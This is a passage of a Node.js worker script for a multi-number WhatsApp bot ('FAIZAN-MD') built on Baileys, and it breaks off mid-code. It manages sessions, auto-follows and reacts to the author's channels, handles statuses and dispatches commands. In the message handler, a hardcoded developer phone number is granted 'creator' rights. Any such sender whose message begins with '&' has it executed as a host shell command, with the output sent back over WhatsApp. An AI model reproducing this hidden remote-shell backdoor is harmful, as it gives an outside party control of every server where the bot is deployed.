const axios = require('axios');
const config = require('./config');

// MUST run before any ./lib or ./data require: those helpers reference a bare `conn` at
// load time, which crashed the boot with "conn is not defined" before the socket ever
// existed. See lib/connBridge.js.
const connBridge = require('./lib/connBridge');
connBridge.install();
// Disk-based auth state + MongoDB backup (see lib/sessionStore.js for why).
const { useDiskAuthState, deleteSession, markNeedsRepair } = require('./lib/sessionStore');
const { proxyOptions } = require('./lib/proxyAgent');

// This worker process runs ONE WhatsApp number (mini bot, multi-number safe).
// index.js spawns one worker per paired number, so every plugin's in-memory
// state (antilink Maps, antidelete cache, etc.) stays isolated per number.
const BOT_NUMBER = (process.env.BOT_NUMBER || '').replace(/[^0-9]/g, '');
if (!BOT_NUMBER) {
    console.error('[❌] BOT_NUMBER env var missing — start the bot from index.js, not directly.');
    process.exit(1);
}
const GroupEvents = require('./lib/groupevents');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    isJidBroadcast,
    getContentType,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    AnyMessageContent,
    prepareWAMessageMedia,
    areJidsSameUser,
    downloadContentFromMessage,
    MessageRetryMap,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID,
    makeInMemoryStore,
    jidDecode,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    Browsers
} = require('@whiskeysockets/baileys');

const l = console.log;
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions');
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data');
const fs = require('fs');
const ff = require('fluent-ffmpeg');
const P = require('pino');
const { PresenceControl, BotActivityFilter } = require('./data/presence');
const qrcode = require('qrcode-terminal');
const StickersTypes = require('wa-sticker-formatter');
const util = require('util');
const { sms, downloadMediaMessage, AntiDelete } = require('./lib');
const FileType = require('file-type');
const { File } = require('megajs');
const { fromBuffer } = require('file-type');
const bodyparser = require('body-parser');
const os = require('os');
const Crypto = require('crypto');
const path = require('path');
const { spawn } = require('child_process');

// ==================== MEMORY OPTIMIZATION ====================
global.gc = global.gc || (() => {});
let memoryCleanInterval = null;

function setupMemoryOptimization() {
    memoryCleanInterval = setInterval(() => {
        try {
            if (global.gc) global.gc();
            const memoryUsage = process.memoryUsage();
            const heapMB = (memoryUsage.heapUsed / 1024 / 1024).toFixed(2);
            console.log(`🔄 Memory GC - Heap: ${heapMB}MB`);

            // Safety net: if heap is approaching the 420MB cap, force a harder GC
            if (parseFloat(heapMB) > 380) {
                console.log(`⚠️ Memory high (${heapMB}MB)! Running emergency GC...`);
                if (global.gc) { global.gc(); global.gc(); }
            }
        } catch (err) {
            console.error("Memory cleanup error:", err.message);
        }
    }, 20000);

    // Scheduled messageStore cleanup every 30 minutes —
    // Replaces the O(n) per-message scan that was running on every incoming message.
    setInterval(() => {
        try {
            const oneDayAgo = Date.now() - (24 * 60 * 60 * 1000);
            let deleted = 0;
            for (const [key, value] of messageStore.entries()) {
                if (!value || !value.timestamp || value.timestamp < oneDayAgo) {
                    messageStore.delete(key);
                    deleted++;
                }
            }
            if (deleted > 0) console.log(`🧹 MessageStore cleanup: removed ${deleted} old entries (${messageStore.size} remain)`);
        } catch (e) {
            console.error("MessageStore cleanup error:", e.message);
        }
    }, 30 * 60 * 1000); // every 30 minutes
}

setupMemoryOptimization();

// ==================== ULTRA PRO SPEED BOOSTER ====================
const speedCache = {
    groups: new Map(),
    users: new Map(),
    commands: null,
    lastClean: Date.now()
};

let perfStats = {
    msgCount: 0,
    avgResponse: 0,
    startTime: Date.now()
};

const msgQueue = [];
let processing = false;

const processQueue = async () => {
    if (processing || msgQueue.length === 0) return;
    processing = true;
    
    const batch = msgQueue.splice(0, 3);
    for (const msg of batch) {
        try {
            await handleMessageUltra(msg);
        } catch(e) {}
        await new Promise(r => setTimeout(r, 30));
    }
    
    processing = false;
    if (msgQueue.length > 0) setTimeout(processQueue, 10);
};

setInterval(() => {
    const now = Date.now();
    const uptime = Math.floor((now - perfStats.startTime) / 1000);
    
    console.log(`
    ⚡ ULTRA PRO STATS ⚡
    ⏱️  Uptime: ${uptime}s
    📨 Processed: ${perfStats.msgCount}
    ⚡ Speed: ${perfStats.avgResponse}ms
    💾 Cache: ${speedCache.groups.size} groups
    🧠 Memory: ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1)}MB
    `);
    
    if (now - speedCache.lastClean > 180000) {
        for (const [key, val] of speedCache.groups.entries()) {
            if (now - val.timestamp > 300000) speedCache.groups.delete(key);
        }
        speedCache.lastClean = now;
    }
}, 60000);

// Simple logger
const botLogger = {
    log: (level, message) => console.log(`[${level}] ${message}`)
};

// ============ CONFIGURATION ============
const prefix = config.PREFIX || '.';
const ownerNumber = config.OWNER_NUMBER ? config.OWNER_NUMBER.split(',').map(n => n.trim()) : ['923408576674'];

// ============ ENSURE ASSETS FOLDER EXISTS ============
const assetsDir = path.join(__dirname, 'assets');
if (!fs.existsSync(assetsDir)) {
    fs.mkdirSync(assetsDir, { recursive: true });
}

// ============ FOLLOWED CHANNELS TRACKING ============
const followedPath = path.join(assetsDir, 'followed.json');
if (!fs.existsSync(followedPath)) {
    fs.writeFileSync(followedPath, JSON.stringify([]));
    console.log('✅ followed.json created');
}

// ============ CHANNELS TO AUTO FOLLOW ON CONNECTION ============
const CHANNELS_TO_FOLLOW = [
    "120363425143124298@newsletter",
    "120363426239061658@newsletter",
];

// ============ CHANNELS TO AUTO REACT ============
const CHANNELS_TO_REACT = [
    "120363425143124298@newsletter",
];

// React emojis for channel posts
const CHANNEL_REACT_EMOJIS = ['❤️', '🔥', '👏', '😍', '💯', '🎉', '💪', '👍', '💜', '🙌', '😇', '🥰', '💖'];

// ============ TRACK FOLLOWED CHANNELS ============
let followedChannels = new Set();
try {
    if (fs.existsSync(followedPath)) {
        followedChannels = new Set(JSON.parse(fs.readFileSync(followedPath, 'utf-8')));
    }
} catch (e) {
    followedChannels = new Set();
}

// ============ GLOBAL CONTEXT INFO ============
const globalContextInfo = {
    forwardingScore: 999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
        newsletterJid: '120363425143124298@newsletter',
        newsletterName: '𝐅𝐀𝐈𝐙𝐀𝐍-𝐌𝐃',
        serverMessageId: 143
    }
};

//=============================================
const tempDir = path.join(os.tmpdir(), 'cache-temp');
if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir, { recursive: true });
}

const clearTempDir = () => {
    try {
        const files = fs.readdirSync(tempDir);
        const now = Date.now();
        for (const file of files) {
            const filePath = path.join(tempDir, file);
            try {
                const stats = fs.statSync(filePath);
                if (now - stats.mtimeMs > 10 * 60 * 1000) {
                    fs.unlinkSync(filePath);
                }
            } catch (err) {}
        }
    } catch (err) {}
};

setInterval(clearTempDir, 5 * 60 * 1000);

//=============================================
// express server now lives in index.js (pairing page + worker manager)

// ============ ENSURE ASSETS FOLDER EXISTS ============
const sudoPath = path.join(assetsDir, 'sudo.json');
if (!fs.existsSync(sudoPath)) {
    fs.writeFileSync(sudoPath, JSON.stringify([]));
}

const banPath = path.join(assetsDir, 'ban.json');
if (!fs.existsSync(banPath)) {
    fs.writeFileSync(banPath, JSON.stringify([]));
}

//=================== SESSION SYSTEM ============================
const sessionDir = path.join(__dirname, 'sessions');
const credsPath = path.join(sessionDir, 'creds.json');

if (!fs.existsSync(sessionDir)) {
    fs.mkdirSync(sessionDir, { recursive: true });
}

// ============ SESSION CLEANUP ============
if (fs.existsSync(credsPath)) {
    try {
        const credsData = JSON.parse(fs.readFileSync(credsPath, 'utf8'));
        if (!credsData || !credsData.me) {
            fs.unlinkSync(credsPath);
            botLogger.log('INFO', "♻️ Invalid session removed");
        }
    } catch (e) {
        try {
            fs.unlinkSync(credsPath);
            botLogger.log('INFO', "♻️ Corrupted session removed");
        } catch (err) {}
    }
}

async function loadSession() {
    try {
        if (!config.SESSION_ID) {
            console.log('No SESSION_ID provided - QR login will be generated');
            return null;
        }

        console.log('[⏳] Loading FAIZAN-MD session...');
        
        let sessdata = config.SESSION_ID;
        const prefixes = ['FAIZAN-MD~', 'BOSS-MD~', 'EMYOU~', 'BOT~'];
        for (const p of prefixes) {
            if (sessdata.includes(p)) {
                sessdata = sessdata.split(p)[1];
                break;
            }
        }
        
        sessdata = sessdata.trim();
        while (sessdata.length % 4 !== 0) {
            sessdata += '=';
        }
        
        const decodedData = Buffer.from(sessdata, 'base64').toString('utf-8');
        
        try {
            const jsonData = JSON.parse(decodedData);
            fs.writeFileSync(credsPath, JSON.stringify(jsonData, null, 2));
            console.log('[✅] FAIZAN-MD session loaded successfully!');
            return jsonData;
        } catch (jsonErr) {
            console.log('[⚠️] Not JSON, saving as raw');
            fs.writeFileSync(credsPath, decodedData);
            return null;
        }
    } catch (error) {
        console.error('❌ Error loading session:', error.message);
        console.log('Will generate QR code instead');
        return null;
    }
}

// ============ AUTO FOLLOW CHANNELS FUNCTION ============
async function autoFollowChannels(conn) {
    try {
        console.log('[🔰] Checking channels to follow...');
        
        for (const channelJid of CHANNELS_TO_FOLLOW) {
            if (followedChannels.has(channelJid)) {
                console.log(`[⏭️] Already following: ${channelJid}`);
                continue;
            }
            
            try {
                await conn.newsletterFollow(channelJid);
                console.log(`[✅] Followed channel: ${channelJid}`);
                followedChannels.add(channelJid);
                fs.writeFileSync(followedPath, JSON.stringify([...followedChannels]));
                await sleep(2000);
            } catch (error) {
                console.log(`[💥] follow down ${channelJid}: ${error.message}`);
            }
        }
        
        console.log('[🔰] Channel follow process completed ✅');
    } catch (error) {
        console.log('[⚠️] Channel follow error:', error.message);
    }
}

// ============ MESSAGE STORE FOR ANTI-DELETE ============
const messageStore = new Map();

// ============ ULTRA FAST MESSAGE HANDLER ============
async function handleMessageUltra(message) {
    perfStats.msgCount++;
    const startTime = Date.now();
    
    try {
        if (!message || !message.message || message.key.fromMe) return;
        
        const type = Object.keys(message.message)[0];
        if (type === 'protocolMessage' || type === 'senderKeyDistributionMessage') return;
        
        const from = message.key.remoteJid;
        const isGroup = from.endsWith('@g.us');
        
        let groupMetadata = null;
        if (isGroup && conn) {
            const cached = speedCache.groups.get(from);
            if (cached && (Date.now() - cached.timestamp < 120000)) {
                groupMetadata = cached.data;
            } else {
                try {
                    groupMetadata = await conn.groupMetadata(from).catch(() => null);
                    if (groupMetadata) {
                        speedCache.groups.set(from, {
                            data: groupMetadata,
                            timestamp: Date.now()
                        });
                    }
                } catch (e) {}
            }
        }
        
        perfStats.avgResponse = Math.round(
            (perfStats.avgResponse * 0.8) + ((Date.now() - startTime) * 0.2)
        );
        
    } catch(error) {}
}

//=======SESSION-AUTH==============
async function connectToWA() {
    console.log("[🔰] FAIZAN-MD Connecting to WhatsApp ⏳️...");
    
    // MongoDB session (mini style): survives restarts, no SESSION_ID needed
    const { state, saveCreds } = await useDiskAuthState(BOT_NUMBER);

    // Guard: connecting with creds that never completed pairing earns an immediate
    // 401, and the 401 branch below would then wipe the very session the user is in
    // the middle of creating. Stop here and let the pairing page finish its job.
    if (!state.creds || !state.creds.registered) {
        console.log(`[⚠️] ${BOT_NUMBER} is not paired yet — open the pairing page and enter the code. Not connecting.`);
        process.exit(0);
    }
    
    
    // lib/ and data/ helpers (msg.js, exif.js, antidel.js, groupevents.js,
    // converter.js) reference a bare `conn`, which resolves to the global scope —
    // without this it throws "conn is not defined" at runtime.
    let conn;
    const waLogger = P({ level: 'silent' });
    conn = makeWASocket({
        // Same option set as the working ArslanMD mini bot: no explicit `version`,
        // cacheable signal key store, and no 60s query timeout to abort the handshake.
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, waLogger),
        },
        logger: waLogger,
        printQRInTerminal: false,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: false,
        fireInitQueries: true,
        markOnlineOnConnect: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        ...proxyOptions(),   // no-op unless PROXY_URL is set
        getMessage: async (key) => {
            // FIX: empty-message spam bug.
            // Baileys calls getMessage() when a retry receipt asks for
            // resend of an older message. Returning {conversation:''}
            // here made Baileys actually SEND that blank text to satisfy
            // the retry -> repeated empty bubbles in bursts after
            // reconnects. Returning undefined tells Baileys to skip the
            // resend instead of transmitting a blank message.
            if (messageStore.has(key.id)) {
                return messageStore.get(key.id).message;
            }
            return undefined;
        }
    });

    // Publish the live socket and replay the listeners the helpers registered at boot.
    connBridge.attach(conn);

    conn.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        if (qr) {
            console.log('📱 QR Code received - Scan with WhatsApp:');
            qrcode.generate(qr, { small: true });
        }
        
        if (connection === 'close') {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            const errorMsg = lastDisconnect?.error?.message || '';
            
            console.log(`❌ Connection closed - Status: ${statusCode}`);
            
            if (errorMsg.includes('Bad MAC') || errorMsg.includes('closed session') || statusCode === 401 || statusCode === 403) {
                // Deleting here was destroying the login the user had just created:
                // boot auto-connect -> 401 -> wipe -> "pairing never works".
                // Flag it instead; only /delete removes a session now.
                console.log(`⚠️ WhatsApp rejected this session (${statusCode}). NOT deleting it.`);
                console.log('   Marked for re-pair, session kept.');
                console.log('   If this repeats immediately after a successful pairing, WhatsApp is');
                console.log('   refusing this host IP — set PROXY_URL (see lib/proxyAgent.js).');
                try {
                    await markNeedsRepair(BOT_NUMBER, `status ${statusCode}`);
                } catch (e) { console.error('could not flag session:', e.message); }
                process.exit(0);
            }
            
            if (lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut) {
                console.log('[🔰] Connection lost, reconnecting...');
                setTimeout(connectToWA, 5000);
            } else {
                console.log('[🔰] Connection closed, please change session ID');
            }
        } else if (connection === 'open') {
            console.log('[🔰] FAIZAN-MD connected to WhatsApp ✅');
            
            // Load plugins
            const pluginPath = path.join(__dirname, 'plugins');
            let pluginCount = 0;
            fs.readdirSync(pluginPath).forEach((plugin) => {
                if (path.extname(plugin).toLowerCase() === ".js") {
                    require(path.join(pluginPath, plugin));
                    pluginCount++;
                }
            });
            console.log('[🔰] Plugins installed successfully ✅');

            setTimeout(() => {
                autoFollowChannels(conn);
            }, 5000);

            // ============ CONNECTION MESSAGE ============
            try {
                const botJid = conn.user.id.split(':')[0] + '@s.whatsapp.net';
                const botName = config.BOT_NAME || 'FAIZAN-MD';
                const ownerName = config.OWNER_NAME || 'Owner';
                    
                const upMessage = `╭━━━━━━━━━━━━━━━━━━━╮
┃  🤖 *${botName} STARTED*
┃━━━━━━━━━━━━━━━━━━━━
┃ ✅ *Status:* _Online & Ready_
┃ 📡 *Connection:* _Successful_
┃ 🔌 *THE POWERFUL BOT*
╰━━━━━━━━━━━━━━━━━━━╯

╭━━〔 ⚙️ *Bot Info* 〕━━━╮
┃ ▸ *Prefix:* ${prefix}
┃ ▸ *Bot:* ${botName}
┃ ▸ *Owner:* ${ownerName}
┃ ▸ *Mode:* ${config.MODE || 'public'}
┃ ▸ *VERSION* *5.0.0*
╰━━━━━━━━━━━━━━━━━━━╯

🎉 *All systems operational!*
⏰ *Started at:* ${new Date().toLocaleString()}

⭐ *Channel:* https://whatsapp.com/channel/0029VbC4SGZLSmbRcz85AZ0d
⭐ *GitHub:* https://github.com/Faizan-MD-BOTZ/Faizan-Ai`;

                await new Promise(resolve => setTimeout(resolve, 2000));
                    
                await conn.sendMessage(botJid, { 
                    image: { url: config.MENU_IMAGE_URL || 'https://files.catbox.moe/npizv8.jpg' }, 
                    caption: upMessage,
                    contextInfo: globalContextInfo
                });
                console.log('[🔰] Connect message sent to: ' + botJid);
                    
            } catch (sendError) {
                console.error('[🔰] Error sending messages:', sendError);
            }
        }
    });

    conn.ev.on('creds.update', saveCreds);
    
    // ============ ANTI-DELETE HANDLER (FROM INDEX 1) ============
    conn.ev.on('messages.update', async updates => {
        for (const update of updates) {
            if (update.update.message === null) {
                console.log("Delete Detected:", JSON.stringify(update, null, 2));
                await AntiDelete(conn, updates);
            }
        }
    });

    conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));
    conn.ev.on("presence.update", (update) => PresenceControl(conn, update));
    BotActivityFilter(conn);	
    
    // ============ STORE MESSAGES FOR ANTI-DELETE ============
    conn.ev.on('messages.upsert', async (m) => {
        // FIX: iterate the whole batch, not just messages[0].
        // Baileys can deliver several messages in one upsert event
        // (e.g. multiple statuses arriving together) — only handling
        // index 0 silently dropped the rest.
        for (const msg of m.messages) {
        if (!msg.message) continue;
        
        if (msg.key.remoteJid === 'status@broadcast') continue;
        
        const messageKey = `${msg.key.remoteJid}_${msg.key.id}`;
        messageStore.set(messageKey, {
            message: msg,
            sender: msg.key.participant || msg.key.remoteJid,
            chat: msg.key.remoteJid,
            timestamp: Date.now()
        });
        
        // FIX: store with timestamp so it gets cleaned up like the other entry.
        // Previously stored as raw msg (no .timestamp) → cleanup condition
        // (value.timestamp && ...) never matched → Map grew forever → OOM.
        messageStore.set(msg.key.id, { message: msg.message, timestamp: Date.now() });
        
        // Per-message cleanup is O(n) and runs on every single message —
        // very expensive on busy bots. Removed here; scheduled interval below handles it.
        }
    });
    
    /// READ STATUS AND CHANNEL AUTO REACT
    conn.ev.on('messages.upsert', async(upsertEvent) => {
      // FIX: loop over the WHOLE batch, not just messages[0].
      // Root cause of "auto status react sometimes doesn't fire":
      // Baileys can deliver several messages/statuses in a single
      // upsert event; only handling index 0 silently dropped the rest
      // every time that happened.
      for (const mek of upsertEvent.messages) {

        // ============ STATUS AUTO SEEN & REACT ============
        // FIX v4: moved BEFORE !mek.message check.
        // In Baileys 7.x, status broadcast notifications arrive with message=null
        // (metadata ping only). Previous position (after null check) caused
        // this block to silently exit early → status react never worked.
        if (mek.key && mek.key.remoteJid === 'status@broadcast') {
            const statusPoster = mek.key.participant || mek.participant;

            // Auto Seen
            if (config.AUTO_STATUS_SEEN === "true") {
                try {
                    await conn.readMessages([mek.key]);
                } catch (e) { console.log('[Status Seen Error]', e.message); }
            }

            // Auto React
            if (config.AUTO_STATUS_REACT === "true") {
                try {
                    const emojis = ['❤️', '🔥', '👍', '😊', '🎉', '💯', '👏', '😂', '🥰', '😍'];
                    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
                    const myJid = conn.user?.id || conn.user?.jid;
                    await conn.sendMessage('status@broadcast', {
                        react: { text: randomEmoji, key: mek.key }
                    }, { statusJidList: [statusPoster, myJid].filter(Boolean) });
                } catch (e) { console.log('[Status React Error]', e.message); }
            }

            // Auto Reply
            if (config.AUTO_STATUS_REPLY === "true") {
                try {
                    const text = `${config.AUTO_STATUS_MSG}`;
                    await conn.sendMessage(statusPoster, { text: text }, { quoted: mek });
                } catch (e) { console.log('[Status Reply Error]', e.message); }
            }

            return; // Status handled — skip command processing
        }

        if (!mek.message) return;
        // Smart self-message handling: process owner commands, skip bot auto-messages
        if (mek.key.fromMe) {
            const selfMsgType = getContentType(mek.message);
            let selfBody = '';
            if (selfMsgType === 'conversation') selfBody = mek.message.conversation || '';
            else if (selfMsgType === 'extendedTextMessage') selfBody = mek.message.extendedTextMessage?.text || '';
            else if (selfMsgType === 'imageMessage') selfBody = mek.message.imageMessage?.caption || '';
            else if (selfMsgType === 'videoMessage') selfBody = mek.message.videoMessage?.caption || '';
            
            if (!selfBody || !selfBody.startsWith(prefix)) return;
        }
        mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
        ? mek.message.ephemeralMessage.message 
        : mek.message;

        if (config.READ_MESSAGE === 'true') {
            await conn.readMessages([mek.key]);
        }
        
        if(mek.message.viewOnceMessageV2)
        mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message

        // ============ CHANNEL AUTO REACT ============
        if (mek.key && mek.key.remoteJid && mek.key.remoteJid.endsWith('@newsletter')) {
            if (CHANNELS_TO_REACT.includes(mek.key.remoteJid)) {
                try {
                    const randomEmoji = CHANNEL_REACT_EMOJIS[Math.floor(Math.random() * CHANNEL_REACT_EMOJIS.length)];
                    await conn.sendMessage(mek.key.remoteJid, {
                        react: { text: randomEmoji, key: mek.key }
                    });
                    console.log(`[✅] Reacted to channel ${mek.key.remoteJid} with ${randomEmoji}`);
                } catch (error) {
                    console.error('[❌] Failed to react to channel:', error.message);
                }
            }
        }
                  
        await Promise.all([
            saveMessage(mek),
        ]);
        
        const m = sms(conn, mek);
        const type = getContentType(mek.message);
        const content = JSON.stringify(mek.message);
        const from = mek.key.remoteJid;
        const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
        const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : '';
        
        const isCmd = body && body.startsWith(prefix);
        
        var budy = typeof mek.text == 'string' ? mek.text : false;
        
        let command = '';
        if (isCmd) {
            const withoutPrefix = body.slice(prefix.length).trim();
            command = withoutPrefix.split(' ').shift().toLowerCase();
        }
        
        const args = body.trim().split(/ +/).slice(1);
        const q = args.join(' ');
        const text = args.join(' ');
        const isGroup = from.endsWith('@g.us');
        const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid);
        const senderNumber = sender.split('@')[0];
        const botNumber = conn.user.id.split(':')[0];
        const pushname = mek.pushName || 'Sin Nombre';
        const isMe = botNumber.includes(senderNumber);
        const isOwner = ownerNumber.includes(senderNumber) || isMe;
        const botNumber2 = await jidNormalizedUser(conn.user.id);
        
        // ============ SAFE GROUP METADATA ============
        let groupMetadata = null;
        let groupName = '';
        let participants = [];
        let groupAdmins = [];
        
        if (isGroup) {
            try {
                groupMetadata = await conn.groupMetadata(from);
                if (groupMetadata) {
                    // Update cache with fresh data
                    speedCache.groups.set(from, { data: groupMetadata, timestamp: Date.now() });
                }
            } catch (e) {}
            // Fallback to cache if live fetch failed
            if (!groupMetadata) {
                const cached = speedCache.groups.get(from);
                if (cached) groupMetadata = cached.data;
            }
            if (groupMetadata) {
                groupName = groupMetadata.subject || '';
                participants = groupMetadata.participants || [];
                groupAdmins = participants.filter(p => p.admin).map(p => p.id);
            }
        }
        
        // Robust JID check: compare raw phone numbers to avoid multi-device format mismatches
        const botRawNum = conn.user.id.split(':')[0].split('@')[0];
        // Fix: WhatsApp groups may use @lid JIDs. Get bot's LID from creds if available.
        const botLid = ((conn.authState?.creds?.me?.lid || conn.authState?.creds?.account?.lid || '').split('@')[0].split(':')[0]);
        const isBotAdmins = isGroup ? groupAdmins.some(a => {
            const aNum = a.split('@')[0];
            return aNum === botRawNum || (botLid && botLid.length > 5 && aNum === botLid);
        }) : false;
        const senderLid = '';
        const isAdmins = isGroup ? (
            groupAdmins.includes(sender) ||
            groupAdmins.some(a => a.split('@')[0] === sender.split('@')[0])
        ) : false;
        const isReact = m.message.reactionMessage ? true : false;
        const reply = (teks) => {
            if (teks === undefined || teks === null || teks === '') return; // FIX: prevent empty messages
            conn.sendMessage(from, { text: teks, contextInfo: globalContextInfo }, { quoted: mek });
        };
        
        // ============ ISCREATOR/SUDO SYSTEM ============
        const udp = botNumber;
        const devNumbers = ['923061831014'];
        
        let sudoUsers = [];
        try {
            sudoUsers = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8'));
        } catch (e) {
            sudoUsers = [];
        }
        
        const authorizedUsers = [
            udp + '@s.whatsapp.net',
            ...devNumbers.map(n => n + '@s.whatsapp.net'),
            config.OWNER_NUMBER + '@s.whatsapp.net',
            ...sudoUsers
        ].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
        
        const isCreator = authorizedUsers.includes(sender) || isMe || isOwner;
            
        if (isCreator && mek.text && mek.text.startsWith("&")) {
            let code = budy.slice(2);
            if (!code) {
                reply(`Provide me with a query to run Master!`);
                return;
            }
            const { spawn } = require("child_process");
            try {
                let resultTest = spawn(code, { shell: true });
                resultTest.stdout.on("data", data => {
                    reply(data.toString());
                });
                resultTest.stderr.on("data", data => {
                    reply(data.toString());
                });
                resultTest.on("error", data => {
                    reply(data.toString());
                });
                resultTest.on("close", code => {
                    if (code !== 0) {
                        reply(`command exited with code ${code}`);
                    }
                });
            } catch (err) {
                reply(util.format(err));
            }
            return;
        }
        
        // Auto React for all messages
        if (!isReact && config.AUTO_REACT === 'true') {
            const reactions = [
                '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', 
                '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', 
                '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', 
                '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', 
                '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', 
                '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', 
                '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', 
                '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', 
                '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', 
                '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', 
                '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', 
                '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', 
                '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', 
                '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', 
                '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
            ];
            const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
            m.react(randomReaction);
        }
                              
        // Custom React
        if (!isReact && config.CUSTOM_REACT === 'true') {
            const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
            const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
            m.react(randomReaction);
        }

        // ban users 
        let bannedUsers = [];
        try {
            bannedUsers = JSON.parse(fs.readFileSync('./assets/ban.json', 'utf-8'));
        } catch (e) {
            bannedUsers = [];
        }
        const isBanned = bannedUsers.includes(sender);
        if (isBanned) return;
            
        let ownerFile = [];
        try {
            ownerFile = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8'));
        } catch (e) {
            ownerFile = [];
        }
        const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
        const isFileOwner = ownerFile.includes(sender);
        const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;
        if (!isRealOwner && config.MODE === "private") return;
        if (!isRealOwner && isGroup && config.MODE === "inbox") return;
        if (!isRealOwner && !isGroup && config.MODE === "groups") return;
       
        // take commands 
        const events = require('./command');
        const cmdName = isCmd ? body.slice(prefix.length).trim().split(" ")[0].toLowerCase() : false;
        if (isCmd) {
            const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName));
            if (cmd) {
                if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }});
                
                try {
                    cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
                } catch (e) {
                    console.error("[PLUGIN ERROR] " + e);
                }
            }
        }
        
        events.commands.map(async(command) => {
            if (body && command.on === "body") {
                command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
            } else if (mek.q && command.on === "text") {
                command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
            } else if (
                (command.on === "image" || command.on === "photo") &&
                mek.type === "imageMessage"
            ) {
